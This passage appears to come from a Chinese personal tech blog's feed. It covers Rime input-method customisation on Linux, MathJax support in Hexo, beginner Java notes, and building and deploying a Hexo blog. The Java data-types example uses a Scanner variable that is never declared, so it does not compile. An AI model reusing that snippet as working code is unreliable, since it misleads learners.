<h1 id="添加输入法"><a href="#添加输入法" class="headerlink" title="添加输入法"></a>添加输入法</h1><h2 id="非gnome桌面"><a href="#非gnome桌面" class="headerlink" title="非gnome桌面"></a>非gnome桌面</h2><p>IBus首选项 ==&gt; 输入法 ==&gt; 添加 ==&gt; 中文 ==&gt; Rime</p>
<h2 id="gnome桌面"><a href="#gnome桌面" class="headerlink" title="gnome桌面"></a>gnome桌面</h2><p><strong>只有添加了多个输入源后状态烂才会显示输入法</strong><br><strong>使用Super键(Windows键)+空格键换输入法</strong></p>
<p>设置 ==&gt; 区域与语言 ==&gt; 输入源 ==&gt; 添加 ==&gt; 汉语 ==&gt; 选择rime添加</p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p><strong>使用rime时，按<code>Ctrl+`` 或</code>F4` 可进行输入切换</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 拼音</span><br><span class="line">2. 中文　－›　西文</span><br><span class="line">3. 全角　－›　半角</span><br><span class="line">4. 漢字　－›　汉字</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>将候选框横向显示</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.config/ibus/rime/build/ibus_rime.yaml  <span class="comment">#新建文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加内容，保存后重新部署rime</span></span><br><span class="line">style:</span><br><span class="line">	horizontal: <span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<p><strong>默认英文输入，需要中文时再切换</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .config/ibus/rime/luna_pinyin.custom.yaml  <span class="comment">#新建朙月拼音定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加入内容,保存后重新部署rime</span></span><br><span class="line"><span class="comment"># 0或1两种状态</span></span><br><span class="line"></span><br><span class="line">patch:</span><br><span class="line">  <span class="string">&quot;switches/@0/reset&quot;</span>: 1</span><br></pre></td></tr></table></figure></p>
<p><strong>定制字体字号</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .config/ibus/rime/luna_pinyin.custom.yaml  <span class="comment">#朙月拼音定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加定制</span></span><br><span class="line"></span><br><span class="line">patch:</span><br><span class="line">  <span class="string">&quot;style/font_face&quot;</span>: <span class="string">&quot;明兰&quot;</span>  <span class="comment"># 字体名称，从记事本等处的系统字体对话框里能看到</span></span><br><span class="line">  <span class="string">&quot;style/font_point&quot;</span>: 14     <span class="comment"># 字号，只认数字的，不认「五号」、「小五」这样的</span></span><br></pre></td></tr></table></figure></p>
<p><strong>定制皮肤配色</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim .config/ibus/rime/luna_pinyin.custom.yaml  <span class="comment">#朙月拼音定制文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加定制</span></span><br><span class="line"></span><br><span class="line">patch:</span><br><span class="line">	<span class="string">&quot;style/color_scheme&quot;</span>: mecolor 	<span class="comment"># 用于选中下面定义的新方案</span></span><br><span class="line">	<span class="string">&quot;preset_color_schemes/mecolor&quot;</span>: <span class="comment"># 在配色方案列表里加入标识为 mecolor 的新方案</span></span><br><span class="line">        name: mecolor</span><br><span class="line">        author: eonun</span><br><span class="line">        back_color: 0xEBEBEB 		<span class="comment"># 底色 24位色值，用十六进制书写方便</span></span><br><span class="line">        border_color: 0xE6E6E6 		<span class="comment"># 边框颜色</span></span><br><span class="line">        text_color: 0x992E8E 		<span class="comment"># 编码行文字颜色</span></span><br><span class="line">        hilited_text_color: 0x6F6FED 	<span class="comment"># 高亮文字</span></span><br><span class="line">        hilited_back_color: 0xDDDDDD 	<span class="comment"># 高亮文字的底色</span></span><br><span class="line">        hilited_candidate_text_color: 0x1303FF 	<span class="comment"># 高亮候选项的文字颜色</span></span><br><span class="line">        hilited_candidate_back_color: 0xCFCBC8 	<span class="comment"># 高亮候选项的底色</span></span><br><span class="line">        candidate_text_color: 0xFFFFFF 	<span class="comment"># 候选项文字颜色</span></span><br><span class="line">        comment_text_color: 0x4A95B5 	<span class="comment"># 候选项提示</span></span><br></pre></td></tr></table></figure>
<p><strong><a href="https://bennyyip.github.io/Rime-See-Me/">配色生成器</a></strong></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ibus</tag>
        <tag>输入法</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo配置支持MathJax</title>
    <url>/2019/10/09/Hexo%E9%85%8D%E7%BD%AE%E6%94%AF%E6%8C%81MathJax/</url>
    <content><![CDATA[<h1 id="替换Marked"><a href="#替换Marked" class="headerlink" title="替换Marked"></a>替换Marked</h1><p>  <code>hexo</code> 默认的渲染引擎是<code>marked</code>，但是 <code>marked</code> 不支持 <code>MathJax</code>。 <code>kramed</code> 是在 <code>marked</code> 的基础上进行修改，能够支持<code>MathJax</code>。</p>
<p>  <a href="https://github.com/sun11/hexo-renderer-kramed">kramed项目</a><br>  先卸载原来默认的渲染引擎<code>marked</code>，然后安装<code>kramed</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn remove hexo-renderer-marked</span><br><span class="line">yarn add hexo-renderer-kramed</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p><strong>博客目录下</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/_config.yml</span><br></pre></td></tr></table></figure>
<p>找到<code>math</code>配置项开启</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Math Formulas Render Support</span></span><br><span class="line"><span class="attr">math:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment"># 默认值（true）将按需加载mathjax / katex脚本去渲染在Front-matter中具有`mathjax：true`的页面。</span></span><br><span class="line">  <span class="comment"># 如果将其设置为false，它将在每一页加载mathjax/katex脚本</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 完整的MathJax支持所需的hexo-renderer-pandoc（或hexo-renderer-kramed）</span></span><br><span class="line">  <span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># https://mhchem.github.io/MathJax-mhchem/</span></span><br><span class="line">    <span class="attr">mhchem:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># 完整的Katex支持需要hexo-renderer-markdown-it-plus（或带有markdown-it-katex插件的hexo-renderer-markdown-it）</span></span><br><span class="line">  <span class="attr">katex:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class="line">    <span class="attr">copy_tex:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p><strong>在需要使用Mathjax的文章<code>Front-matter</code>中添加<code>mathjax: true</code></strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章名</span><br><span class="line">category: 分类</span><br><span class="line">date: 2019/10/09</span><br><span class="line">mathjax: true</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h1 id="方案2"><a href="#方案2" class="headerlink" title="方案2"></a>方案2</h1><p>  另一种方案是使用<a href="https://github.com/CHENXCHEN/hexo-renderer-markdown-it-plus">hexo-renderer-markdown-it-plus</a></p>
<p>参考:<a href="https://ranmaosong.github.io/2017/11/29/hexo-support-mathjax/">如何在hexo中支持Mathjax?</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>MathJax</tag>
      </tags>
  </entry>
  <entry>
    <title>Java笔记整理（初级）</title>
    <url>/2019/08/20/Java%E7%AC%94%E8%AE%B0%E6%95%B4%E7%90%86%EF%BC%88%E5%88%9D%E7%BA%A7%EF%BC%89/</url>
    <content><![CDATA[<h1 id="Java笔记整理（初级）"><a href="#Java笔记整理（初级）" class="headerlink" title="Java笔记整理（初级）"></a>Java笔记整理（初级）</h1><p>程序是用来给人服务的，不要被束缚了思想，我们是为了实现某个目的来学习编程写代码的，而不是说为了编程而学编程。语法是固有存在的，需要怎么用才能到达目的是灵活变通的，学习编程就如学习加减法：1+1=2,2-1=1…是固有的，而想要怎么加怎么减才能得到想要的数那是千变万化的。<strong>固有的部分需要死记硬背，变化的部分需要用死记硬背的内容来灵活变通。</strong>其实固有的部分多敲多写就能记下的，剩下的就是学会如何变通达到目的就行了（算法）。</p>
<p>如果我现在想让程序输出一段话，就会用到编程入门万年不变的第一个程序<code>Holle Word</code></p>
<h3 id="编程入门万年不变的第一个程序"><a href="#编程入门万年不变的第一个程序" class="headerlink" title="编程入门万年不变的第一个程序"></a>编程入门万年不变的第一个程序</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim 第一个程序.java</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 第一个程序 </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[]args)</span></span>&#123;</span><br><span class="line">		System.out.println(<span class="string">&quot;万年不变的入门程序，Holle Word！&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">public class 第一个程序		//公开（public）的类(class)  类名&quot;第一个程序&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">public static void main(String[]args)	//公开、静态(static)、无返回值(void)的主函数  函数(方法) 名“main” 函数的参数是字符串类型的数组“args”</span></span><br><span class="line"><span class="comment">//主函数是程序的入口  必须要有主函数程序才能运行，主函数名固定为“main”</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">System.out.println		//标准输出语句，用于输出（打印）出字符串内容</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="八大数据类型"><a href="#八大数据类型" class="headerlink" title="八大数据类型"></a>八大数据类型</h3><p>计算机的运行离不开内存的存在，内存用来临时存放运行中的程序，当<code>程序被运行时会被加载到内存中</code>，等待被执行相关指令。程序向内存加载的过程需要内存准备相应的空间来存放程序，而<code>内存的空间是有限的，不能为了一个很小的程序就将内存分配都分配给它</code>，所有就需要给程序的限制内存占用大小，因此就产生了数据类型，<code>数据类型就是用来给程序的参数值规定范围大小的</code>，用不同的数据类型定义不同的参数值从而规范了程序的内存使用。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim 八大类型.java</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 八大类型 </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[]args)</span> </span>&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">byte</span> by=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">		<span class="keyword">short</span> sh=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> in=s.nextInt();</span><br><span class="line">		<span class="keyword">long</span> lo=s.nextLong();</span><br><span class="line">		<span class="keyword">double</span> d=s.nextDouble();</span><br><span class="line">		<span class="keyword">float</span> fl=s.nextFloat();</span><br><span class="line">		String st=s.next();</span><br><span class="line">		<span class="keyword">boolean</span> bo=s.hasNext();</span><br><span class="line">		System.out.println(by+<span class="string">&quot;,&quot;</span>+sh+<span class="string">&quot;,&quot;</span>+in+<span class="string">&quot;,&quot;</span>+lo</span><br><span class="line">			+<span class="string">&quot;,&quot;</span>+d+<span class="string">&quot;,&quot;</span>+fl+<span class="string">&quot;,&quot;</span>+st+<span class="string">&quot;,&quot;</span>+bo);	<span class="comment">//将数据是输出</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux上搭建Hexo博客</title>
    <url>/2019/07/13/Linux%E4%B8%8A%E6%90%AD%E5%BB%BAHexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h2 id="Linux-上搭建Hexo博客"><a href="#Linux-上搭建Hexo博客" class="headerlink" title="Linux 上搭建Hexo博客"></a>Linux 上搭建Hexo博客</h2><h3 id="在本地搭建"><a href="#在本地搭建" class="headerlink" title="在本地搭建"></a>在本地搭建</h3><h4 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h4><p>（archlinux发行版及其衍生版上，其他版本可用相关的软件包管理工具进行安装，如：yum apt-get，也可到官网下载安装包进行安装）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo pacman -S nodejs</span><br><span class="line"><span class="comment">#项目出现TypeError [ERR_INVALID_ARG_TYPE]错误时降级安装nodejs-lts-erbium node12长期支持版</span></span><br><span class="line"></span><br><span class="line">node -v</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h4 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><p>（archlinux发行版及其衍生版上，其他版本可先安装npm包管理工具，再用npm来安装hexo）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yay nodejs-hexo	<span class="comment">#安装时一路回车就行，npm等几个软件包可选不删除，这里推荐使用yarn代替npm</span></span><br><span class="line"><span class="comment">#若安装hexo后删除了npm，需要用npm的自行安装即可: sudo pacman -S npm</span></span><br><span class="line">sudo pacman -S yarn</span><br><span class="line">hexo -v</span><br><span class="line">yarn -v</span><br><span class="line"><span class="comment">#npm -v</span></span><br><span class="line">yarn config <span class="built_in">set</span> prefix /usr/<span class="built_in">local</span>	<span class="comment">#修改全局安装路径,修改后如进行全局安装时就需要加sudo</span></span><br><span class="line"><span class="comment">#或添加环境变量：</span></span><br><span class="line"><span class="comment">#bash ：export PATH=&quot;$(yarn global bin):$PATH&quot;</span></span><br><span class="line"><span class="comment">#fish ： vim ~/.config/fish/config.fish  #加入： set PATH (yarn global bin) $PATH</span></span><br></pre></td></tr></table></figure>
<p><strong>yarn与npm命令替换</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">npm (v5)</th>
<th style="text-align:left">Yarn</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>npm install [package] --save</code></td>
<td style="text-align:left"><code>yarn add [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --save-dev</code></td>
<td style="text-align:left"><code>yarn add [package] --dev</code></td>
</tr>
<tr>
<td style="text-align:left"><em>(N/A)</em></td>
<td style="text-align:left"><code>yarn add [package] --peer</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --save-optional</code></td>
<td style="text-align:left"><code>yarn add [package] --optional</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --save-exact</code></td>
<td style="text-align:left"><code>yarn add [package] --exact</code></td>
</tr>
<tr>
<td style="text-align:left"><em>(N/A)</em></td>
<td style="text-align:left"><code>yarn add [package] --tilde</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm install [package] --global</code></td>
<td style="text-align:left"><code>yarn global add [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm update --global</code></td>
<td style="text-align:left"><code>yarn global upgrade</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm rebuild</code></td>
<td style="text-align:left"><code>yarn add --force</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm uninstall [package]</code></td>
<td style="text-align:left"><code>yarn remove [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm cache clean</code></td>
<td style="text-align:left"><code>yarn cache clean [package]</code></td>
</tr>
<tr>
<td style="text-align:left"><code>rm -rf node_modules &amp;&amp; npm install</code></td>
<td style="text-align:left"><code>yarn upgrade</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm version major</code></td>
<td style="text-align:left"><code>yarn version --major</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm version minor</code></td>
<td style="text-align:left"><code>yarn version --minor</code></td>
</tr>
<tr>
<td style="text-align:left"><code>npm version patch</code></td>
<td style="text-align:left"><code>yarn version --patch</code></td>
</tr>
</tbody>
</table>
</div>
<h4 id="镜像源配置"><a href="#镜像源配置" class="headerlink" title="镜像源配置"></a>镜像源配置</h4><h5 id="简单修改"><a href="#简单修改" class="headerlink" title="简单修改"></a>简单修改</h5><p><strong>npm</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 临时修改（只生效一次）</span></span><br><span class="line">npm install 包的名字 --registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#  设置npm的配置项（全局配置）</span></span><br><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看npm源的当前地址</span></span><br><span class="line">npm config get registry</span><br></pre></td></tr></table></figure></p>
<p><strong>yarn</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 临时修改（只生效一次）</span></span><br><span class="line">yarn save 包的名字 --registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment">#  设置npm的配置项（全局配置）</span></span><br><span class="line">yarn config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看npm源的当前地址</span></span><br><span class="line">yarn config get registry</span><br></pre></td></tr></table></figure></p>
<h5 id="使用工具修改"><a href="#使用工具修改" class="headerlink" title="使用工具修改"></a>使用工具修改</h5><p><strong>npm</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装工具</span></span><br><span class="line">npm install -g nrm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出可选源</span></span><br><span class="line">nrm ls</span><br><span class="line"></span><br><span class="line">* npm ---- https://registry.npmjs.org/</span><br><span class="line">  cnpm --- http://r.cnpmjs.org/</span><br><span class="line">  taobao - https://registry.npm.taobao.org/</span><br><span class="line">  nj ----- https://registry.nodejitsu.com/</span><br><span class="line">  rednpm - http://registry.mirror.cqupt.edu.cn/</span><br><span class="line">  npmMirror  https://skimdb.npmjs.com/registry/</span><br><span class="line">  edunpm - http://registry.enpmjs.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试源响应时间</span></span><br><span class="line">nrm <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">* npm ---- 1440ms</span><br><span class="line">  cnpm --- 937ms</span><br><span class="line">  taobao - 392ms</span><br><span class="line">  nj ----- Fetch Error</span><br><span class="line">  rednpm - Fetch Error</span><br><span class="line">  npmMirror  1296ms</span><br><span class="line">  edunpm - Fetch Error</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换源</span></span><br><span class="line">nrm use taobao</span><br></pre></td></tr></table></figure>
<p><strong>yarn</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装工具</span></span><br><span class="line">sudo yarn global add yrm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出可选源</span></span><br><span class="line">yrm ls</span><br><span class="line"></span><br><span class="line">* npm ---- https://registry.npmjs.org/</span><br><span class="line">  cnpm --- http://r.cnpmjs.org/</span><br><span class="line">  taobao - https://registry.npm.taobao.org/</span><br><span class="line">  nj ----- https://registry.nodejitsu.com/</span><br><span class="line">  rednpm - http://registry.mirror.cqupt.edu.cn/</span><br><span class="line">  npmMirror  https://skimdb.npmjs.com/registry/</span><br><span class="line">  edunpm - http://registry.enpmjs.org/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试源响应时间</span></span><br><span class="line">yrm <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"> * npm ---- 13480ms</span><br><span class="line">  cnpm --- 1807ms</span><br><span class="line">  taobao - 482ms</span><br><span class="line">  nj ----- Fetch Error</span><br><span class="line">  rednpm - Fetch Error</span><br><span class="line">  npmMirror  2499ms</span><br><span class="line">  edunpm - Fetch Error</span><br><span class="line">  yarn --- Fetch Error</span><br><span class="line"></span><br><span class="line"><span class="comment"># 切换源</span></span><br><span class="line">yrm use taobao</span><br></pre></td></tr></table></figure>
<h4 id="开始搭建"><a href="#开始搭建" class="headerlink" title="开始搭建"></a>开始搭建</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir ～/blog	<span class="comment">#新建一个目录夹用于存放博客文件，如果有错误，直接删除该目录都行</span></span><br><span class="line"><span class="built_in">cd</span> ~/blog</span><br><span class="line">hexo init	<span class="comment">#生成博客框架文件，出现WARN警告可以忽略，当出现ERR报错时就的将该目录下的所有文件删除，排除错误后从来</span></span><br><span class="line"><span class="comment">#出现INFO  Start blogging with Hexo!代表成功</span></span><br></pre></td></tr></table></figure>
<p><strong>开启本地访问服务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo s	<span class="comment">#hexo server	将开启本地的4000端口用来访问博客</span></span><br></pre></td></tr></table></figure>
<p><strong>新建文章</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo n “文章名”	<span class="comment">#hexo new “文章名”</span></span><br></pre></td></tr></table></figure>
<p><strong>清除缓存</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo cl		<span class="comment">#hexo clean</span></span><br></pre></td></tr></table></figure>
<p><strong>生成静态文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g		<span class="comment">#hexo generate</span></span><br></pre></td></tr></table></figure>
<h4 id="hexo的一些指令"><a href="#hexo的一些指令" class="headerlink" title="hexo的一些指令"></a>hexo的一些指令</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">clean     删除生成的文件和缓存</span><br><span class="line">config    获取或设置配置</span><br><span class="line">deploy    部署到远程站点</span><br><span class="line">generate  生成静态文件</span><br><span class="line"><span class="built_in">help</span>      获取有关命令的帮助</span><br><span class="line">init      创建一个新的Hexo文件夹</span><br><span class="line">list      列出网站的信息</span><br><span class="line">migrate   将您的站点从其他系统迁移到Hexo</span><br><span class="line">new       创建一个新帖子</span><br><span class="line">publish   将草稿帖子从_drafts移动到_posts文件夹</span><br><span class="line">render    使用渲染器插件渲染文件</span><br><span class="line">server    启动服务器 </span><br><span class="line">version   显示版本信息</span><br></pre></td></tr></table></figure>
<h3 id="将博客部署到GitHub上"><a href="#将博客部署到GitHub上" class="headerlink" title="将博客部署到GitHub上"></a>将博客部署到GitHub上</h3><h4 id="准备GitHub仓库"><a href="#准备GitHub仓库" class="headerlink" title="准备GitHub仓库"></a>准备GitHub仓库</h4><p>在github上创建一个以<code>用户名.github.io</code>命名的公开仓库,如：<code>eonun.github.io</code>获得仓库地址:<code>https://github.com/eonun/eonun.github.io.git</code></p>
<h4 id="安装git部署插件"><a href="#安装git部署插件" class="headerlink" title="安装git部署插件"></a>安装git部署插件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-deployer-git	<span class="comment">#在博客主目录下，安装部署插件</span></span><br></pre></td></tr></table></figure>
<h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml	<span class="comment">#修改在博客目录下的配置文件</span></span><br><span class="line"><span class="comment">#在末尾修改如下</span></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment">#仓库地址</span></span><br><span class="line">  repo: https://github.com/eonun/eonun.github.io.git</span><br><span class="line">  branch: gh-pages</span><br></pre></td></tr></table></figure>
<h4 id="将本地的博客文件上传到github上"><a href="#将本地的博客文件上传到github上" class="headerlink" title="将本地的博客文件上传到github上"></a>将本地的博客文件上传到github上</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo d	<span class="comment">#输入账号密码验证</span></span><br></pre></td></tr></table></figure>
<h4 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h4><p>在仓库中能查看到博客文件了，等待几分钟后以仓库名作网址访问：<code>eonun.github.io</code>即可访问个人博客网站</p>
<h3 id="将博客部署到coding上"><a href="#将博客部署到coding上" class="headerlink" title="将博客部署到coding上"></a>将博客部署到coding上</h3><h4 id="准备仓库"><a href="#准备仓库" class="headerlink" title="准备仓库"></a>准备仓库</h4><p><code>coding</code>分团队版和个人版，大致都差不多的</p>
<p>创建一个仓库，<strong>名字可随意</strong>，不用像<code>github</code>那样有严格的格式，</p>
<h3 id="开启静态网页服务"><a href="#开启静态网页服务" class="headerlink" title="开启静态网页服务"></a>开启静态网页服务</h3><p><code>coding</code>的项目需要自己开启静态网页服务</p>
<p><strong>团队版：</strong> 项目<code>&gt;</code>持续部署<code>&gt;</code>静态网站    <strong><em>可选项</em></strong>：<code>&gt;</code>设置<code>&gt;</code>自定义域名<code>&gt;</code>绑定新域名<code>&gt;</code>绑定首选域名<code>&gt;</code>强制HTTPS</p>
<p><strong>个人版：</strong> 项目<code>&gt;</code>代码<code>&gt;</code>Pages服务，一键开启</p>
<p>开启<code>Pages</code>服务后会得到一个访问地址，个人版的地址是<code>用户名.coding.me/项目名</code>,团队版的是<code>随机码.coding-pages.com</code>如果没有自己的域名的建议使用个人版。</p>
<h4 id="安装git部署插件-1"><a href="#安装git部署插件-1" class="headerlink" title="安装git部署插件"></a>安装git部署插件</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-deployer-git	<span class="comment">#在博客主目录下，安装部署插件</span></span><br></pre></td></tr></table></figure>
<h3 id="修改配置文件-1"><a href="#修改配置文件-1" class="headerlink" title="修改配置文件"></a>修改配置文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml	<span class="comment">#修改在博客目录下的配置文件</span></span><br><span class="line"><span class="comment">#在末尾修改如下</span></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  <span class="comment">#仓库地址</span></span><br><span class="line">  repo: https://github.com/eonun/eonun.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<h3 id="多git平台搭建"><a href="#多git平台搭建" class="headerlink" title="多git平台搭建"></a>多git平台搭建</h3><p>配置ssh-key，参考<a href="../../../08/21/git入手/">git入手</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml	<span class="comment">#修改在博客目录下的配置文件</span></span><br><span class="line"><span class="comment">#在末尾修改如下</span></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo:</span><br><span class="line">      github: git@github.com:eonun/eonun.github.io.git</span><br><span class="line">      coding: git@e.coding.net:eonun/eonun.git</span><br><span class="line">  branch:</span><br><span class="line">      github: gh-pages</span><br><span class="line">      coding: coding-pages</span><br></pre></td></tr></table></figure>
<p>有条件的自己搭个服务器才是最终解决方案</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>免费私有项目</th>
<th>自定义域名</th>
<th>CI/CD</th>
<th>服务器</th>
</tr>
</thead>
<tbody>
<tr>
<td>GitHub</td>
<td>是 (私有后无法开启Pages)</td>
<td>是</td>
<td>否</td>
<td>荷兰</td>
</tr>
<tr>
<td>GitLab</td>
<td>是</td>
<td>是</td>
<td>是</td>
<td>美国</td>
</tr>
<tr>
<td>Gitee</td>
<td>是</td>
<td>99/年</td>
<td>否</td>
<td>湖北</td>
</tr>
<tr>
<td>Coding</td>
<td>是</td>
<td>是</td>
<td>否</td>
<td>香港</td>
</tr>
</tbody>
</table>
</div>
<h3 id="绑定个人域名"><a href="#绑定个人域名" class="headerlink" title="绑定个人域名"></a>绑定个人域名</h3><h4 id="购买域名并添加解析-如不需要，可直接用仓库名做自己的博客域名，无需单独购买"><a href="#购买域名并添加解析-如不需要，可直接用仓库名做自己的博客域名，无需单独购买" class="headerlink" title="购买域名并添加解析(如不需要，可直接用仓库名做自己的博客域名，无需单独购买)"></a>购买域名并添加解析(如不需要，可直接用仓库名做自己的博客域名，无需单独购买)</h4><p>选择合适的域名注册商注册一个域名，阿里腾讯都行。购买域名后添加解析</p>
<p>IP地址通过<code>ping</code>访问地址获得</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">主机记录</th>
<th style="text-align:left">记录类型</th>
<th style="text-align:left">记录值</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">@</td>
<td style="text-align:left">A</td>
<td style="text-align:left">IP地址</td>
</tr>
<tr>
<td style="text-align:left">www</td>
<td style="text-align:left">CNAME</td>
<td style="text-align:left">仓库名</td>
</tr>
</tbody>
</table>
</div>
<p>如:</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">主机记录</th>
